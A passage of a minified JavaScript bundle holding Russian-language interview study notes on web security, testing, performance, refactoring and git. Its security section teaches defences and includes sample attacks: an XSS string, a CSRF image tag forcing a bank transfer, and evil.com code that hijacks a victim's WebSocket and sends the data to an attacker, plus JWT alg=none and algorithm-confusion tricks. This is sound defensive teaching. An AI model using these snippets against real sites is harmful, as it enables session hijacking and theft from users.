`<` превращается в `&lt;`, `>` в `&gt;` и т.д. — строка рендерится как текст, не как HTML:\n```jsx\nconst userInput = '<script>alert(1)<\/script>';\n<div>{userInput}</div>\n// В DOM: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> — безопасно\n```\n\n**Где React НЕ защищает:**\n```jsx\n// dangerouslySetInnerHTML — вставляет HTML как есть:\n<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ❌\n\n// href с javascript: — выполнится при клике:\n<a href={userUrl}>link</a> // если userUrl = 'javascript:alert(1)' — ❌\n// Защита: проверять что href начинается с https://, не с javascript:\n```\n\n**Полная защита:**\n• React JSX — включена по умолчанию\n• Санитизация через DOMPurify перед dangerouslySetInnerHTML\n• CSP заголовок — запрещает inline-скрипты и внешние домены\n• HttpOnly cookies — украденные через XSS куки нельзя прочитать через JS\n• Валидация href/src атрибутов если они из пользовательских данных",score:3.5},{name:"CSRF",level:"3",content:`**CSRF (Cross-Site Request Forgery)** — атака при которой браузер жертвы отправляет запрос на доверенный сайт от её имени, без её ведома.

**Почему это работает — браузер автоматически шлёт куки:**
\`\`\`
1. Пользователь залогинен на bank.com (в браузере есть cookie с сессией)
2. Пользователь заходит на evil.com
3. evil.com содержит:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   или форму которая автоматически сабмитится через JS
4. Браузер делает запрос на bank.com — и автоматически прикрепляет cookie
5. Банк видит валидную сессию и выполняет перевод
\`\`\`
Пользователь ничего не нажимал — браузер сделал всё сам.

**Защита 1 — CSRF-токен:**
Сервер генерирует уникальный случайный токен, кладёт его в форму (скрытое поле) и в сессию. При запросе сравнивает. Атакующий не знает этот токен — не может сформировать валидный запрос:
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="r4nd0m_s3cr3t">
  ...
</form>
\`\`\`

**Защита 2 — SameSite cookie:**
Атрибут куки, указывающий браузеру когда слать куки в кросс-доменных запросах:
\`\`\`
SameSite=Strict  — куки шлются ТОЛЬКО при навигации с того же домена.
                   Даже переход по ссылке с другого сайта не пришлёт куки.
                   Ломает OAuth-редиректы — редко используют для session cookie.

SameSite=Lax     — куки шлются при навигации (ссылки, адресная строка),
                   но НЕ при автоматических запросах (img, form POST, XHR).
                   Дефолт в современных браузерах. Хороший баланс.

SameSite=None    — куки шлются всегда. Требует Secure (только HTTPS).
                   Для третьесторонних куки (трекинг, виджеты).
\`\`\`
Lax защищает от большинства CSRF-атак — форма на evil.com, сабмитящаяся в bank.com, не получит куки.

**Защита 3 — проверка Origin/Referer заголовка:**
Сервер проверяет откуда пришёл запрос. Если Origin не совпадает с доверенным доменом — отклоняет.

**Почему JWT в Authorization header защищает от CSRF:**
Браузер автоматически шлёт только куки. Authorization header атакующий из кросс-доменного запроса добавить не может — для этого нужен JS, а JS заблокирует CORS. Поэтому API с токеном в заголовке CSRF-безопасны без дополнительных мер.`,score:3.5},{name:"Безопасность JWT",level:"3",content:`**JWT (JSON Web Token)** — три части через точку: \`header.payload.signature\`, каждая в Base64.
\`\`\`
eyJhbGciOiJIUzI1NiJ9  ← header: { alg: "HS256" }
.eyJ1c2VySWQiOjQyfQ    ← payload: { userId: 42, exp: 1716000000 }
.SflKxwRJSMeKKF2QT4fw  ← подпись (HMAC SHA256 от header+payload с секретным ключом)
\`\`\`

**JWT не шифрует — только подписывает.** Payload декодируется любым base64-декодером без ключа. Не класть в payload: пароли, секреты, персональные данные которые не должны видеть клиенты.

**Атака: alg=none:**
Оригинальная уязвимость JWT. Атакующий меняет алгоритм в header на \`none\` и убирает подпись — некоторые библиотеки принимали такой токен как валидный:
\`\`\`js
// Уязвимая проверка:
jwt.verify(token); // не указан алгоритм

// Безопасная:
jwt.verify(token, secret, { algorithms: ['HS256'] }); // явно указать алгоритм
\`\`\`

**Атака: алгоритм confusion (RS256 → HS256):**
Асимметричный RS256 использует пару: приватный ключ для подписи, публичный для проверки. Публичный ключ — публичный по определению. Атакующий меняет алгоритм на симметричный HS256 и подписывает токен публичным ключом как HMAC-секретом. Уязвимая библиотека проверяет его тем же публичным ключом и принимает.

Защита: всегда явно указывать ожидаемый алгоритм.

**Нельзя мгновенно инвалидировать:**
JWT stateless — сервер не хранит список токенов. Если украли access token — он работает до exp. Решения:
• Короткий срок жизни (15 мин) — украденный токен быстро протухнет
• Blacklist (список отозванных jti) — нарушает stateless, но даёт мгновенную инвалидацию
• Версия в токене — при логауте инкрементировать версию в БД, проверять при запросах

**Где хранить (повторение из темы Auth, ключевое):**
\`\`\`
localStorage  — читается JS → украдут через XSS ❌
Cookie без httpOnly — то же самое ❌
httpOnly cookie — JS не читает, CSRF защищён SameSite=Lax ✅
in-memory (переменная) — исчезает при перезагрузке, самое безопасное ✅
\`\`\`

**Когда JWT лучше session:**
Микросервисы — каждый сервис проверяет подпись локально без запроса к хранилищу сессий. Горизонтальное масштабирование — не нужен общий Redis.`,score:3.5},{name:"Работа SSL/TLS",level:"4",content:`**TLS (Transport Layer Security)** — протокол шифрования соединения. SSL — его устаревший предшественник, название часто используют как синоним хотя SSL давно не применяется.

**Зачем нужен TLS:**
Без шифрования все данные передаются в открытом виде. Любой узел на пути (провайдер, роутер, публичный Wi-Fi) может прочитать или подменить их. MITM (Man-in-the-Middle, "человек посередине") — атакующий встаёт между клиентом и сервером, перехватывает и при желании изменяет трафик. Обе стороны думают что говорят напрямую.

TLS решает три задачи:
• **Шифрование** — данные нечитаемы для третьих лиц
• **Аутентификация сервера** — клиент уверен что говорит именно с bank.com, а не с подменой
• **Целостность** — данные не изменены в пути. Проверяется через MAC (Message Authentication Code) — криптографическая контрольная сумма сообщения

**TLS Handshake — как устанавливается защищённое соединение (TLS 1.3):**
\`\`\`
1. ClientHello
   Клиент → сервер: список поддерживаемых алгоритмов шифрования,
   случайное число (client random)

2. ServerHello + Certificate + Key Exchange
   Сервер → клиент: выбранный алгоритм, свой публичный ключ
   для обмена по алгоритму Диффи-Хеллмана, сертификат

3. Клиент проверяет сертификат:
   - Подпись валидна? (доверяем CA из системного хранилища)
   - Домен совпадает? Смотрим CN (Common Name — поле с доменом)
     или SAN (Subject Alternative Name — список альтернативных доменов,
     например *.example.com)
   - Не истёк? (срок действия)

4. Обмен ключами по алгоритму Диффи-Хеллмана (DH):
   Клиент и сервер каждый генерируют свою пару ключей,
   обмениваются публичными частями и независимо вычисляют
   один и тот же сессионный ключ — не передавая его по сети.
   Математика устроена так что зная только публичные части
   вычислить ключ третьей стороне практически невозможно.

5. Всё дальнейшее шифруется сессионным ключом
   алгоритмом AES (Advanced Encryption Standard) —
   симметричный блочный шифр, стандарт индустрии
\`\`\`
TLS 1.3 — 1 RTT (Round Trip Time, одно время туда-обратно) вместо 2 у TLS 1.2. Соединение устанавливается быстрее.

**Сертификаты и цепочка доверия:**
Сертификат содержит: домен, публичный ключ сервера, подпись выдавшего CA.
CA (Certificate Authority) — организация-удостоверяющий центр, чьи корневые сертификаты встроены в ОС и браузеры. Браузер им доверяет изначально.

Цепочка: Root CA (встроен в систему) → Intermediate CA (промежуточный) → Сертификат сайта. Браузер идёт по цепочке и проверяет каждую подпись.

Let's Encrypt — бесплатный CA, выдаёт сертификаты автоматически через ACME-протокол (Automated Certificate Management Environment — стандартный протокол для автоматического получения и обновления сертификатов). Certbot — популярный ACME-клиент.

**HSTS (HTTP Strict Transport Security)** — заголовок который браузер запоминает:
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
После первого получения браузер год (31536000 секунд) будет автоматически открывать этот домен по HTTPS, игнорируя http://. Защита от SSL stripping — атаки где злоумышленник перехватывает первый HTTP-запрос до редиректа на HTTPS и держит жертву на незашифрованном соединении.`,score:3.5},{name:"Организация безопасности при реализации WebSocket-ов",level:"4",content:`**Чем WebSocket отличается от HTTP с точки зрения безопасности:**
WebSocket — persistent-соединение (постоянное, не закрывается после ответа). После установки handshake (HTTP Upgrade → WebSocket) между клиентом и сервером открыт постоянный двусторонний канал. Это меняет модель угроз: атакующий может влиять не на один запрос, а на весь поток сообщений на протяжении сессии.

**Угроза 1 — CSWSH (Cross-Site WebSocket Hijacking, межсайтовый перехват WebSocket):**
Аналог CSRF для WebSocket. WebSocket-handshake — это обычный HTTP-запрос, и браузер автоматически прикрепляет к нему куки. Атакующий с evil.com может открыть WebSocket-соединение с victim.com от имени залогиненной жертвы:
\`\`\`js
// Код на evil.com:
const ws = new WebSocket('wss://victim.com/ws');
// Браузер прикрепит куки жертвы к handshake-запросу
ws.onmessage = (e) => sendToAttacker(e.data); // читает приватные данные жертвы
\`\`\`

**Защита от CSWSH — проверка заголовка Origin при handshake:**
\`\`\`js
// Сервер при обработке WebSocket upgrade-запроса:
const origin = request.headers['origin'];
const allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];

if (!allowedOrigins.includes(origin)) {
  socket.destroy(); // отклонить соединение
  return;
}
\`\`\`
Origin — это заголовок который браузер выставляет сам и не позволяет JS его подделать. С curl или Postman можно выставить любой Origin — но это атаки не из браузера, там нет куки жертвы.

**Угроза 2 — отсутствие аутентификации:**
WebSocket сам по себе не имеет встроенной аутентификации. Проверять кто подключается нужно явно. Три подхода:
\`\`\`js
// Вариант 1 — токен в URL (не рекомендуется: токен попадает в логи сервера):
new WebSocket('wss://api.com/ws?token=eyJhbGc...');

// Вариант 2 — первым сообщением сразу после подключения:
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'auth', token: getAccessToken() }));
};
// Сервер ждёт auth-сообщение, при неверном токене — закрывает соединение
// Другие сообщения до аутентификации игнорировать!

// Вариант 3 — httpOnly cookie + проверка Origin (если сессия в куки)
// Origin защищает от CSWSH, cookie передаётся браузером автоматически
\`\`\`

**Угроза 3 — инъекции через входящие сообщения:**
Все данные от клиента — потенциально вредоносные. WebSocket не ограничивает формат сообщений — можно слать что угодно:
\`\`\`js
ws.on('message', (raw) => {
  let msg;
  try {
    msg = JSON.parse(raw);
  } catch {
    ws.close(1003, 'Invalid format'); // 1003 — unsupported data
    return;
  }

  // Проверить схему: ожидаемые поля, типы, длину строк
  if (!isValidMessage(msg)) {
    ws.close(1008, 'Policy violation');
    return;
  }

  // Дальше работать только с проверенными данными
  // Не передавать в eval, innerHTML, SQL без обработки
});
\`\`\`

**Угроза 4 — flood (флуд) / DDoS (Distributed Denial of Service — распределённая атака отказа в обслуживании):**
Один клиент может отправлять тысячи сообщений в секунду, перегружая сервер. Rate limiting (ограничение частоты) на уровне соединения:
\`\`\`js
// Простой rate limiter: не более 10 сообщений в секунду
const msgCount = new Map(); // connectionId → count

ws.on('message', (data) => {
  const count = (msgCount.get(ws.id) ?? 0) + 1;
  msgCount.set(ws.id, count);
  if (count > 10) {
    ws.close(1008, 'Rate limit exceeded');
    return;
  }
  // Сбрасывать счётчик каждую секунду
});
\`\`\`

**WSS (WebSocket Secure)** — WebSocket поверх TLS (аналог HTTPS для WebSocket). Всегда использовать в продакшне: шифрует весь канал, защищает от перехвата и подмены сообщений в пути. \`ws://\` — открытый текст, \`wss://\` — зашифровано.`,score:3.5}]},{id:"testing",title:"ТЕСТИРОВАНИЕ",icon:"🧪",color:"#26A69A",topics:[{name:"Паттерн AAA (Arrange Act Assert)",level:"2",content:`\`\`\`js
// Arrange — подготовка
const calculator = new Calculator();

// Act — действие
const result = calculator.add(2, 3);

// Assert — проверка
expect(result).toBe(5);
\`\`\`

Каждый тест — одно действие, одна проверка. Чистый и читаемый.`},{name:"Моки. Зачем нужны и как применять",level:"3",content:`**Mock** — подделка зависимости с контролируемым поведением.

\`\`\`js
const mockFetch = jest.fn().mockResolvedValue({ json: () => ({ name: 'Alice' }) });
global.fetch = mockFetch;

await loadUser();

expect(mockFetch).toHaveBeenCalledWith('/api/user');
\`\`\`

Зачем: изоляция тестируемого кода, предсказуемость, скорость (не ждём реальный API).`},{name:"Stub, Spy. Зачем нужны и как применять",level:"3",content:`**Stub** — заглушка, возвращающая фиксированное значение. Не проверяем вызов.
\`\`\`js
const getUser = jest.fn().mockReturnValue({ name: 'Alice' });
\`\`\`

**Spy** — наблюдатель, следит за вызовами реального метода без подмены:
\`\`\`js
const spy = jest.spyOn(console, 'log');
doSomething();
expect(spy).toHaveBeenCalledWith('done');
spy.mockRestore();
\`\`\`

**Mock** = Stub + Spy (подменяет и отслеживает).`},{name:"Принцип TDD",level:"3",content:`**TDD (Test-Driven Development):**
1. **Red** — пишем тест → он падает (функционал не реализован)
2. **Green** — пишем минимальный код, чтобы тест прошёл
3. **Refactor** — улучшаем код, тесты продолжают проходить

Преимущества: лучший дизайн кода, высокое покрытие, документация через тесты, уверенность при рефакторинге.`},{name:"Интеграционные и e2e тесты (cypress / playwright)",level:"3",content:`**Unit** — одна функция/компонент в изоляции.
**Интеграционные** — несколько модулей вместе (API + компонент).
**E2E** — полный пользовательский сценарий в реальном браузере.

**Cypress:** JS-фреймворк, работает в браузере, time-travel debugging, автоматические ожидания.
**Playwright:** от Microsoft, мультибраузерный (Chromium, Firefox, WebKit), быстрее, API для мобильных.`},{name:"Пирамида тестирования, инструменты для каждого уровня",level:"3",content:`\`\`\`
       /  E2E  \\       — мало, медленные, дорогие
      / Integration \\   — средне
     /    Unit       \\  — много, быстрые, дешёвые
\`\`\`

**Unit:** Jest, Vitest, React Testing Library
**Integration:** Jest + MSW (Mock Service Worker), Supertest
**E2E:** Cypress, Playwright

**Перевёрнутая пирамида** — антипаттерн: много E2E, мало Unit. Медленные, хрупкие тесты.`},{name:"Coverage. Инструменты и принцип работы",level:"4",content:`**Coverage** — процент кода, выполненного при прогоне тестов.

**Метрики:**
• **Statements** — % выполненных выражений
• **Branches** — % пройденных ветвлений (if/else, switch)
• **Functions** — % вызванных функций
• **Lines** — % выполненных строк

**Инструменты:** istanbul/nyc, Jest --coverage, Vitest --coverage, c8.

**Важно:** 100% coverage ≠ качественные тесты. Можно покрыть всё без проверки правильности. Coverage — метрика полноты, не качества.`},{name:"Unit тестирование",level:"2",content:`Тестирование отдельной функции/компонента в изоляции.

**React Testing Library:**
\`\`\`js
render(<Button label="Click" onClick={mockFn} />);
const btn = screen.getByText('Click');
fireEvent.click(btn);
expect(mockFn).toHaveBeenCalled();
\`\`\`

Принцип: тестируй поведение, не реализацию. Query по тексту/роли, не по className.`}]},{id:"exceptions",title:"ОБРАБОТКА ИСКЛЮЧЕНИЙ, ЛОГИРОВАНИЕ, ДЕБАГ",icon:"🐛",color:"#FF7043",topics:[{name:"try-catch",level:"2",content:`\`\`\`js
try {
  riskyOperation();
} catch (error) {
  console.error(error.message);
} finally {
  cleanup(); // всегда выполняется
}
\`\`\`

**finally** — выполняется всегда (и при ошибке, и без).

**Не ловит:** асинхронные ошибки (setTimeout, Promise). Для промисов — .catch() или try/catch с await.

**Custom Error:**
\`\`\`js
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}
\`\`\``},{name:"Способы дебага клиентского кода",level:"2",content:`• **console.log/warn/error/table/group/time** — базовое логирование
• **debugger** — программный breakpoint
• **DevTools breakpoints** — line, conditional, DOM, XHR, event
• **Source maps** — маппинг минифицированного кода на исходный
• **Network tab** — анализ запросов и ответов
• **Performance tab** — профилирование
• **React DevTools** — дерево компонентов, props, state, profiler`},{name:"redux/react/альтернативы devtools",level:"3",content:`**React DevTools:** дерево компонентов, props, state, hooks, profiler (перерендеры), highlight updates.

**Redux DevTools:** time-travel debugging, просмотр всех actions и state diff, импорт/экспорт состояния.

**Vue DevTools, MobX DevTools, Zustand DevTools** — аналогичные инструменты для своих экосистем.`},{name:"Настройка логирования ошибок (sentry, prometheus и др.)",level:"4",content:`**Sentry** — мониторинг ошибок в реальном времени:
• Автоматический перехват ошибок (window.onerror, unhandledrejection)
• Source maps для читаемых stack traces
• Breadcrumbs — цепочка действий перед ошибкой
• Release tracking — привязка ошибок к версиям
• Performance monitoring

**Prometheus + Grafana** — метрики (больше для backend/инфраструктуры).

**LogRocket / FullStory** — session replay + логирование.`},{name:"Понимание принципа выделения программных узлов для логирования",level:"4",content:`**Что логировать:**
• API-вызовы (запрос, ответ, ошибки)
• Действия пользователя (навигация, клики на ключевые элементы)
• Ошибки рендеринга (ErrorBoundary)
• Бизнес-логика (переходы состояний, транзакции)
• Производительность (долгие операции, медленные рендеры)

**Уровни логирования:** debug, info, warn, error, fatal.

**Не логировать:** чувствительные данные (пароли, токены, персональные данные — GDPR!).`}]},{id:"perf",title:"ПРОИЗВОДИТЕЛЬНОСТЬ",icon:"🚀",color:"#FFC107",topics:[{name:"Инструменты проверки производительности (devtools, lighthouse)",level:"2",content:`**Lighthouse:** аудит Performance, Accessibility, SEO, Best Practices. Даёт оценку 0-100 и рекомендации.

**DevTools Performance tab:** запись и анализ. Flame chart — визуализация стека вызовов. Main thread — видно что блокирует.

**WebPageTest** — тестирование из разных локаций и устройств.
**Chrome UX Report** — реальные данные пользователей.`},{name:"Preload, prefetch, async, defer",level:"2",content:'**Scripts:**\n```html\n<script src="app.js"><\/script>           <!-- блокирует парсинг -->\n<script src="app.js" async><\/script>     <!-- загружает параллельно, выполняет сразу -->\n<script src="app.js" defer><\/script>     <!-- загружает параллельно, выполняет после парсинга -->\n```\n\n**Resource hints:**\n```html\n<link rel="preload" href="font.woff2" as="font">   <!-- загрузить сейчас (критический ресурс) -->\n<link rel="prefetch" href="next-page.js">           <!-- загрузить потом (для будущей навигации) -->\n<link rel="preconnect" href="https://api.com">      <!-- установить соединение заранее -->\n```'},{name:"Метрики клиентской производительности",level:"3",content:`**Core Web Vitals:**
• **LCP (Largest Contentful Paint)** — время отрисовки самого большого элемента. Хорошо: < 2.5s
• **FID (First Input Delay)** / **INP (Interaction to Next Paint)** — задержка реакции на ввод. Хорошо: < 100ms
• **CLS (Cumulative Layout Shift)** — визуальная стабильность (прыжки элементов). Хорошо: < 0.1

**Другие:**
• **FCP (First Contentful Paint)** — первый контент на экране
• **TTFB (Time To First Byte)** — время до первого байта ответа
• **TTI (Time To Interactive)** — когда страница полностью интерактивна`},{name:"Механизмы уменьшения размера бандла, CDN",level:"3",content:`**Уменьшение бандла:**
• **Tree shaking** — удаление неиспользуемого кода (ES modules)
• **Code splitting** — разделение на чанки (React.lazy, dynamic import)
• **Minification** — сжатие кода (Terser)
• **Compression** — gzip, Brotli
• **Анализ бандла** — webpack-bundle-analyzer, source-map-explorer

**CDN (Content Delivery Network):**
Сеть серверов по всему миру. Ресурсы раздаются с ближайшего сервера → меньше latency.
Кэширование на edge-серверах. Защита от DDoS.

**Оптимизация изображений (критично для LCP):**
• Использовать **WebP/AVIF** вместо JPEG/PNG (–25-50% размера)
• **srcset + sizes** — браузер сам выбирает нужный размер, не грузит лишнего
• **loading="lazy"** — для изображений below the fold
• **decoding="async"** — не блокирует main thread при декодировании
• CDN с auto-format (Cloudinary, imgix — автоматически конвертируют в WebP/AVIF)
\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    srcset="hero-400.jpg 400w, hero-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 800px"
    loading="eager"
    fetchpriority="high"
    alt="..."
  />
</picture>
\`\`\`
**fetchpriority="high"** — для LCP-изображения (выше preload в очереди загрузки).`},{name:"Lazy-loading, оптимизация критичного пути",level:"4",content:`**Critical Rendering Path:** HTML → DOM + CSSOM → Render Tree → Layout → Paint.

**Оптимизация:**
• Inline critical CSS (above-the-fold)
• Defer non-critical CSS
• Lazy-load изображений: \`loading="lazy"\`
• Lazy-load компонентов: React.lazy + Suspense
• Минимизировать блокирующие ресурсы
• Preload критических ресурсов

**Intersection Observer:**
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(e => { if (e.isIntersecting) loadImage(e.target); });
});
\`\`\``},{name:"Метрики серверной производительности",level:"4",content:`**TTFB** — время до первого байта. Зависит от сервера, БД, сети.
**Server Response Time** — время обработки запроса.
**Throughput** — количество запросов в секунду.
**Error Rate** — процент ошибочных ответов.

**Мониторинг:** New Relic, DataDog, Prometheus + Grafana.

**Оптимизация:** кэширование (Redis), CDN, оптимизация запросов к БД, horizontal scaling.`}]},{id:"refactoring",title:"РЕФАКТОРИНГ",icon:"🔧",color:"#8D6E63",topics:[{name:"Правила работы с комментариями при рефакторинге",level:"2",content:`**Хорошие комментарии:**
• Объясняют ПОЧЕМУ, а не ЧТО
• TODO / FIXME / HACK с обоснованием
• JSDoc для публичных API
• Регулярные выражения и сложные алгоритмы

**Плохие комментарии:**
• Описывают очевидный код
• Устаревшие (не обновлены при рефакторинге)
• Закомментированный код (удаляй, git помнит)

**Правило:** если код требует комментария — сначала попробуй сделать код понятнее (переименовать, выделить функцию).`},{name:"Основные принципы рефакторинга",level:"3",content:`**Рефакторинг** — изменение внутренней структуры без изменения поведения.

**Принципы:**
• Маленькие шаги + тесты после каждого шага
• Не менять поведение и рефакторить одновременно
• Тесты — safety net (без тестов рефакторинг рискован)
• Роль тестов при рефакторинге — они ДОЛЖНЫ проходить после каждого изменения

**Цели рефакторинга:** улучшить читаемость, убрать дублирование, упростить поддержку, подготовить к новой фиче.`},{name:"Признаки грязного кода",level:"3",content:`**Code Smells:**
• **Длинные функции/методы** (> 20-30 строк)
• **Дублирование кода**
• **Магические числа** (42 вместо MAX_RETRIES)
• **Глубокая вложенность** (if внутри if внутри if)
• **Большие классы / God Object** (один класс делает всё)
• **Feature Envy** — метод больше работает с чужими данными, чем со своими
• **Длинные списки параметров** (> 3 — используй объект)
• **Мёртвый код** — недостижимый или неиспользуемый
• **Shotgun Surgery** — одно изменение требует правок в 10 местах`},{name:"Применять различные методы рефакторинга",level:"3",content:`**Извлечение метода:**
\`\`\`js
// До
function process() { /* 50 строк */ }

// После
function process() {
  validate();
  transform();
  save();
}
\`\`\`

**Извлечение переменной** — сложное выражение → именованная переменная.
**Инкапсуляция полей** — прямой доступ → геттеры/сеттеры.
**Разбиение условного оператора** — сложный if → функции с говорящими именами.
**Замена магических чисел** — константы с понятным именем.
**Inline метод** — обратное извлечению, если метод тривиален.`},{name:"Понимает текущий бэклог технического развития проекта",level:"4",content:`**Технический долг (Tech Debt)** — осознанные или случайные компромиссы в коде.

**Бэклог тех. развития:**
• Обновление зависимостей
• Миграция на новые версии фреймворков
• Покрытие тестами критических путей
• Оптимизация производительности
• Улучшение CI/CD
• Документация архитектурных решений (ADR)

**Senior-ответственность:** видеть картину целиком, приоритизировать тех. долг, обосновывать бизнесу время на рефакторинг, планировать миграции.`}]},{id:"git",title:"GIT",icon:"📦",color:"#F4511E",topics:[{name:"Базовые команды: pull, push, commit, fetch, add, clone",level:"2",content:`**Три зоны:**
Рабочая директория → git add → Staging area → git commit → Repository

\`\`\`bash
git status          # статус файлов
git add file.js     # добавить файл в staging
git add .           # добавить все
git commit -m "msg" # зафиксировать
git push            # отправить на remote
git pull            # fetch + merge
git fetch           # скачать без merge (безопасно)
git clone <url>     # клонировать репо
\`\`\`
fetch vs pull: fetch скачивает изменения, но не применяет. pull = fetch + merge.

**init + config:**
\`\`\`bash
git init                               # инициализировать репо
git config --global user.name "Alex"   # имя для коммитов
git config --global user.email "..."   # email
git config --global core.editor vim    # редактор
git config --list                      # все настройки
\`\`\``},{name:"branch, merge, remote",level:"2",content:`**branch:**
\`\`\`bash
git branch              # список веток
git branch -a           # все включая remote
git branch feature      # создать ветку
git branch -d feature   # удалить ветку
git branch -m old new   # переименовать

git switch feature      # переключиться (Git 2.23+)
git switch -c feature   # создать и переключиться
\`\`\`

**merge:**
\`\`\`bash
git merge feature         # влить feature в текущую ветку
git merge --no-ff feature # всегда создавать merge коммит
git merge --abort         # отменить merge при конфликте
\`\`\`
Fast-forward — когда main не уходил вперёд, Git просто двигает указатель, merge коммита нет.
--no-ff — всегда создаёт merge коммит, видно что была ветка.

**remote:**
\`\`\`bash
git remote -v                      # список remote
git remote add origin https://...  # добавить
git remote remove origin           # удалить
git remote rename origin upstream  # переименовать

git fetch origin       # скачать без merge
git pull origin main   # fetch + merge
\`\`\``},{name:"amend, fixup, revert, cherry-pick, stash, rebase, .gitignore",level:"3",content:`**amend:**
\`\`\`bash
git commit --amend -m "новое сообщение"  # изменить последний коммит
git commit --amend --no-edit             # добавить файлы без смены сообщения
\`\`\`
⚠️ Переписывает SHA коммита. Если уже запушен — нужен git push --force-with-lease.

**stash:**
\`\`\`bash
git stash                  # сохранить изменения
git stash save "описание"  # с описанием
git stash list             # список всех stash
git stash pop              # применить последний и удалить
git stash apply stash@{2}  # применить конкретный
git stash drop             # удалить последний
git stash clear            # удалить все
\`\`\`

**revert vs reset:**
\`\`\`bash
git revert abc123         # новый коммит отменяющий abc123 (безопасно для remote)

git reset --soft HEAD~1   # коммит удалён, изменения в staging
git reset --mixed HEAD~1  # коммит удалён, изменения в рабочей директории
git reset --hard HEAD~1   # коммит и изменения удалены полностью
\`\`\`
Правило: reset только для локальных коммитов. revert когда коммит уже в remote.

**cherry-pick:**
\`\`\`bash
git cherry-pick abc123          # перенести один коммит
git cherry-pick abc123..def456  # диапазон коммитов
\`\`\`
Используется для хотфиксов — перенести исправление бага с одной ветки на другую.

**rebase:**
\`\`\`bash
git rebase main          # перебазировать текущую ветку на main
git rebase -i HEAD~3     # интерактивный rebase последних 3 коммитов
git rebase --abort       # отменить rebase
git rebase --continue    # продолжить после разрешения конфликта
\`\`\`
⚠️ Переписывает историю. Нельзя делать на публичных ветках которые используют другие.

**fixup:**
\`\`\`bash
git commit --fixup abc123             # создать коммит-исправление
git rebase -i --autosquash HEAD~5     # автоматически склеить fixup коммиты
\`\`\`

**.gitignore** — файлы которые git игнорирует (node_modules, .env, dist).`},{name:"log, diff, reflog, tag",level:"3",content:`**log:**
\`\`\`bash
git log --oneline --graph   # самый частый вариант
git log -n 5                # последние 5 коммитов
git log --author="Alex"     # коммиты автора
git log --since="2 weeks"   # за период
git log file.js             # история файла
\`\`\`

**diff:**
\`\`\`bash
git diff                   # изменения не в staging
git diff --staged          # изменения в staging
git diff main feature      # разница между ветками
git diff abc123 def456     # разница между коммитами
\`\`\`

**reflog:**
\`\`\`bash
git reflog               # история всех перемещений HEAD
git reset --hard abc123  # восстановить потерянный коммит
\`\`\`
Хранит историю ~90 дней. Страховка от reset --hard.

**tag:**
\`\`\`bash
git tag v1.0.0                   # lightweight тег
git tag -a v1.0.0 -m "Release"  # annotated тег (предпочтительно)
git push origin v1.0.0           # запушить тег
git push origin --tags           # запушить все теги
git tag -d v1.0.0                # удалить тег
\`\`\``},{name:"hooks",level:"4",content:`**Git Hooks** — скрипты в .git/hooks/ выполняющиеся автоматически при git командах.

**Основные хуки:**
• **pre-commit** — перед коммитом (линтинг, форматирование)
• **commit-msg** — проверка формата сообщения
• **pre-push** — перед push (тесты)

**Husky** — шарит хуки между разработчиками через package.json:
\`\`\`json
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "pre-push": "npm test"
    }
  }
}
\`\`\`
**lint-staged** — запускает линтер только на изменённых файлах.`},{name:"switch, restore",level:"4",content:`Новые команды (Git 2.23+), заменяющие перегруженный checkout:

\`\`\`bash
git switch feature         # переключить ветку
git switch -c feature      # создать и переключить

git restore file.js              # восстановить файл из последнего коммита
git restore --staged file.js     # убрать файл из staging
\`\`\`

checkout делал слишком много (переключение веток + откат файлов). switch и restore — чёткое разделение обязанностей.`},{name:"Способы оптимизации рабочего пространства Git, git-lfs, сабмодули",level:"4",content:`**git-lfs (Large File Storage):**
Для больших бинарных файлов (видео, дизайн, скриншоты). В репозитории хранится указатель, файл — на LFS сервере.
\`\`\`bash
git lfs install
git lfs track "*.png"
git lfs track "*.psd"
git add .gitattributes
\`\`\`

**Субмодули:**
Вложенный git-репозиторий внутри основного. Для переиспользования библиотек между проектами.
\`\`\`bash
git submodule add https://github.com/org/lib  # добавить
git submodule init                             # инициализировать
git submodule update                           # обновить
git clone --recurse-submodules https://...    # клонировать с субмодулями
\`\`\`
Минус — сложность синхронизации в команде.

**Shallow clone:**
\`\`\`bash
git clone --depth 1 <url>  # только последний коммит (быстрее для CI)
\`\`\``},{name:"worktree",level:"4",content:`**git worktree** — несколько рабочих директорий одного репо одновременно. Позволяет работать в нескольких ветках без stash и переключений.

\`\`\`bash
git worktree add ../hotfix main  # создать папку с веткой main
git worktree list                # список worktree
git worktree remove ../hotfix    # удалить
\`\`\`

Кейсы: срочный hotfix без прерывания текущей работы, сравнение двух веток бок о бок, запуск тестов на одной ветке пока работаешь на другой.`}]}],Ye=[...Ff,...zf],Hf=[];Ye.forEach(e=>{e.topics.forEach(t=>{t.content&&Hf.push({section:e.title,sectionColor:e.color,topic:t.name,level:t.level,content:t.content,score:t.score??null})})});function Uf(e){const t=new Set,n=[];return e.forEach(r=>{r.topics.forEach(o=>{if(!o.content)return;const l=/\*\*([^*\n`]+?)\*\*/g;let i;for(;(i=l.exec(o.content))!==null;){const s=i[1].trim();if(s.endsWith(".")||s.endsWith("!")||s.endsWith("?")||/^\d/.test(s)||s.split(/\s+/).length>7||s.length<2)continue;const a=s.toLowerCase();if(t.has(a))continue;t.add(a);const f=o.content.slice(i.index+i[0].length).match(/^[ \t]*[—:][ \t]*([^\n]{5,120})/);let m=f?f[1].replace(/\*\*([^*]+)\*\*/g,"$1").split(/[.!?]/)[0].trim():"";m.endsWith(",")&&(m=m.slice(0,-1)),n.push({name:s,definition:m,sectionId:r.id,sectionTitle:r.title,sectionColor:r.color,sectionIcon:r.icon,topicName:o.name})}})}),n.sort((r,o)=>r.name.localeCompare(o.name,"ru"))}function Wl(e,t){if(!t)return e;const n=e.toLowerCase().indexOf(t.toLowerCase());return 